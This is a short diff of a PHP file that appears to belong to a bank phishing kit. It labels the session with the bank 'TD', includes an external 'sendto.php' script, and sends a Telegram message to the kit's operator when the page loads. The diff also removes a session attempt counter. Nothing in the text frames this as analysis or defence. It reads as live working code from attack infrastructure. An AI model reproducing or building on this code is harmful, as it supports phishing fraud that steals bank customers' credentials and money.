@@ -3,9 +3,7 @@ session_start();
 $_SESSION["bank"] = 'TD';
 require_once "../sendto.php";
 
-if (!isset($_SESSION["try"])){
-  $_SESSION["try"] = 0 ;
-}
+
 
 sendMessageToTelegram('🟡🟡🟡'.$_SESSION['bank'].'🟡🟡🟡'); 
 ?>
